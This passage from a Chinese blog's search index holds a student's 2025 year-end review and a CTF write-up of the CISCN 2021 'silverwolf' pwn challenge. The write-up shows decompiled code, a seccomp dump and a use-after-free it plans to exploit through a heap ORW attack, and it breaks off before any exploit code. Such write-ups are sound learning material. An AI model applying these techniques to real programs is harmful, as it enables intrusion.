<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025年终总结</title>
      <link href="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本作于2025-12-27<br>emm,看到Cu有写年终总结，那么我心血来潮也写一个，虽然很早之前有过这个想法，<del>大抵记录一些琐事吧，毕竟也没有什么轰轰烈烈的经历</del><br>&lt;翻了翻相册，竟然没什么照片&gt;</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="关于我这一年"><a href="#关于我这一年" class="headerlink" title="关于我这一年"></a>关于我这一年</h2><p>  怎么说呢，我其实不太清楚我这一年的成就，我在去年寒假的时候开始学习堆，但是我清楚我自己其实不是很擅长学习，我很笨，无法去很快的学完一些明明看起来很简单的东西，所以我的堆学习的异常艰难，因为我好像无法理解堆之间的操作，也有可能是我那个时候基础巨差，学了一些基础的堆块操作，低版本的堆漏洞，我就没有继续学堆了，因为我貌似学不下去了，</p><p>  后来，我在群里问问题的时候，很幸运，我认识了<code>Astra</code>，Astra可以算是我的良师了。他帮助我扭转了很多错误的观念，他几乎影响了我对pwn的整个认知</p><p>  后面我去打工，暑假回学校之后，打省赛，pwn只有一道题目，非常简单的栈的ORW，但是我写不来，Astra貌似有事，所以没办法帮助我，我当时四个小时，调那道题目，越写越崩溃，我甚至怀疑我应不应该继续走这条路，好在我这个人走出来比较快，我很快想通了，我竟然开始了，就无论如何都要学下去，实在不行，死肝它，我就不信我切不动它！</p><p>  于是乎，我开始补习栈，我将前面的栈的漏洞基本补习过一遍，这几乎用掉了我一个学期的时间，我开始学习，思考，理解这其中的思路，并且认识了许多的师傅，比如A✌️，Cu，当然也是当上了<code>&quot;大佬&quot;</code>，作为菜菜的我没想到竟然也是开始带萌新了。还是挺有意思的，不过有的问题真的容易气得脑溢血，哈哈哈哈，也是体验到了<code>Astra</code>教我的时候的感受了，感触还是挺深的，不过，说不太出来就是了；希望新的一年，我能够多拿点有用的奖，找到实习，学到能就业的水平，遇到越来越多志同道合的师傅，</p><h2 id="比较重要的月份"><a href="#比较重要的月份" class="headerlink" title="比较重要的月份"></a>比较重要的月份</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> mouth[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> i_Remember[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i&lt;=<span class="number">12</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(mouth[i]==i_Remember)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] %d is gread mouth,and things is %c</span></span><br><span class="line"><span class="string">&quot;</span>,i,i_Remember);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>咳咳，搞怪一下 😁</p><p>接下来就是一些我存下来的图片嘞</p><p>这是当时我进实验室的新生赛的pwn,&lt;其实我一开始是web手的 qwq 被学长忽悠了&gt;，后面，我尝试AK了</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/%E7%AC%91.png" class><p>一些题目，</p><p>就是这个题，卡住了两三个小时，不过也是这道题，让我认识了<code>Astra</code> ，这算不算福祸相依呢 哈哈</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/SB.jpg" class><p>咳咳，值得注意的是，我鬼谷子有标了，虽然并不强</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Screenshot_2025-03-27-09-47-50-228_com.tencent.tmgp.sgame.jpg" class><p>我也尝试加入联合战队，但是一个都不要我，这也是一个比较悲伤的故事了。</p><p>xm也投过很多次，导致我后面都不怎么愿意投了(有点失望，也可能是我自己不争气 qwq)</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Screenshot_2025-04-14-21-46-51-210_com.tencent.mobileqq.jpg" class><p>后面参加了振兴杯，拿到了我第一个奖杯 虽然是水过来的三等奖</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251127_170342.jpg" class><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251127_174209.jpg" class><p>然后接触了<code>Archlinux</code>, <code>linux</code>的使用体验真的碾压Windows，如果学习能力比较强，体验自然是极好的，当然我不算，所以我用起来，痛并快乐着，这两张是KDE的</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20250628_213440.png" class title="屏幕截图_20250628_213440"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/wallpaper.png" class title="wallpaper"><p>这张其实是windows的</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Screenshot_2025-09-29-10-28-54-501_youqu.android.todesk.jpg" class title="Screenshot_2025-09-29-10-28-54-501_youqu.android.todesk"><p>写到这里的时候，突然发现我的hyprland还没有一张截图，这不得当即来一张 哈哈哈哈 <img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/260103_00h30m09s_screenshot.png" class title="260103_00h30m09s_screenshot"></p><p>我自然是做了一些微调，不过我个人还是感觉很棒就是了，</p><p>Emm,值得一提的是<code>水c</code>真的是我打过最烂的比赛，<code>py之风</code>盛行，并且服务器打三天，有一天半是进不去的，巨烂，</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Image_1748403959929075.png" class title="Image_1748403959929075"><p>接下来应该没什么了，一些图片&lt;好好的一个年终总结给我写成了图床 qwq&gt;</p><p>送你一朵小花花</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250401_195436.jpg" class title="IMG_20250401_195436"><p>来爬武功山</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_195939.jpg" class title="IMG_20250403_195939"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_204059.jpg" class title="IMG_20250403_204059"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_204214.jpg" class title="IMG_20250403_204214"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_221231.jpg" class title="IMG_20250403_221231"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250404_062622.jpg" class title="IMG_20250404_062622"><p>搬到新寝室，稍微布置一下，不过灯带买亮了，然后尝试拿纸带挡一下光，后面失败了</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250911_211937.jpg" class title="IMG_20250911_211937"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250916_180104.jpg" class title="IMG_20250916_180104"><p>然后就是一些不明所以的风景图<img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250720_173131.jpg" class title="IMG_20250720_173131"></p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250721_190515.jpg" class title="IMG_20250721_190515"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250814_183146.jpg" class title="IMG_20250814_183146"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250917_173714.jpg" class title="IMG_20250917_173714"><p>去长沙玩</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_101024.jpg" class title="IMG_20251022_101024"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_101209.jpg" class title="IMG_20251022_101209"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_103741.jpg" class title="IMG_20251022_103741"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_110525.jpg" class title="IMG_20251022_110525"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_112117.jpg" class title="IMG_20251022_112117"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_115935.jpg" class title="IMG_20251022_115935"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_122836.jpg" class title="IMG_20251022_122836"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_184927.jpg" class title="IMG_20251022_184927"><p>值得一提的是，塔罗真的赚钱，比我们梅花，六爻或者大六壬赚钱多了，所以等以后混不下去了，就去摆塔罗摊子骗钱</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_191453.jpg" class title="IMG_20251022_191453"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_225456.jpg" class title="IMG_20251022_225456"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251023_113018.jpg" class title="IMG_20251023_113018"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251023_113205.jpg" class title="IMG_20251023_113205"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251023_145908.jpg" class title="IMG_20251023_145908"><p>当然也遇到了一些，让人厌烦的 ，ex人的存在，可能我的一些做法伤到了这位玻璃心少爷了吧</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/sb.png" class title="sb"><p>我一个人帮mother劈完了家里的柴 哇哈哈哈</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250207_103946.jpg" class title="IMG_20250207_103946"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250207_163709.jpg" class title="IMG_20250207_163709"><p>其他貌似也没有什么了，所以，到了，结尾</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>25年，学习强度其实并不大，心态有点放松了，也被很多琐事所影响了，希望我26年能够成为pwn🈸，学完所有的东西，然后通杀大赛的pwn &lt;哈哈哈哈，虽然 我知道这不可能&gt; </p><p>那么就尝试学完所有必须的，并且在此基础上拓展，在大赛中取得好名次吧，&lt;据说，网鼎在今年会开&gt;</p><p>也是拖到了2026-1-2才写完的， 我的拖延症昂。。。。。。。</p><p>​——– 显记于小小檐</p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 知识总结 </tag>
            
            <tag> 技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>📚 CISCN_2021_初赛_silverwolf</title>
      <link href="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/"/>
      <url>/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2021-初赛-silverwolf-—-堆上的ORW"><a href="#CISCN-2021-初赛-silverwolf-—-堆上的ORW" class="headerlink" title="[CISCN 2021 初赛]silverwolf —- 堆上的ORW"></a>[CISCN 2021 初赛]silverwolf —- 堆上的ORW</h1><p>尝试复现一些大赛的题目，主要是感觉一点长进都没有，一直刷题不知道学了些什么……</p><p>这题主要是堆上的ORW,跟着gets的<a href="http://www.getspwn.xyz/?p=43">博客</a>来的</p><p>废话不多说，开始，pwninit一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">❯ pwninit pwn</span><br><span class="line">[INFO] 当前已在虚拟环境中: ctf</span><br><span class="line">[INFO] 给二进制文件添加执行权限...</span><br><span class="line">[SUCCESS] 权限添加成功: pwn</span><br><span class="line">[INFO] 检查二进制文件保护:</span><br><span class="line">==================================</span><br><span class="line">[*] &#x27;/mnt/d/TY/网安笔记/CTF_PWN/复现/CISCN_2021_初赛_silverwolf/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">==================================</span><br><span class="line">[INFO] 生成exp.py模板...</span><br><span class="line">[SUCCESS] exp.py生成成功</span><br><span class="line">[SUCCESS] 初始化完成！</span><br></pre></td></tr></table></figure><p>可以看到保护全开，稍微运行了一下，基本的菜单题，拖ida看看 </p><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>我将函数稍微重命名了一下，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">5</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init_();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(&amp;unk_1144, v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();                                  <span class="comment">// malloc chunk_size &lt;= 0x78</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        delete();                               <span class="comment">// UAF</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="init"><a href="#init" class="headerlink" title="init_"></a>init_</h3><p>存在沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v0 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//seccomp-tools dump ./pwn   只给了read open write，很明显打堆上的ORW</span></span><br><span class="line">❯ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A != open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>这里是存在一些问题的，可以看到，程序在输入index之后会有一个**!size**的判断，所以index一定得为0，也就算是说，后面申请的chunk会把前面申请的chunk堵盖掉，同时限制malloc的chunk大小得小于等于0x78</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> chunk_size; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;size);</span><br><span class="line">    chunk_size = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        size_list = chunk_size;</span><br><span class="line">        heap_list = ptr;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p>同时edit也是同样的，有一个判断，v3得为0，也就是只能修改第一个chunk，并且允许我们往chunk里面读取内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heap_list )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = heap_list;</span><br><span class="line">      <span class="keyword">if</span> ( size_list )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="type">char</span> *)heap_list + size_list;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p>很正常的打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 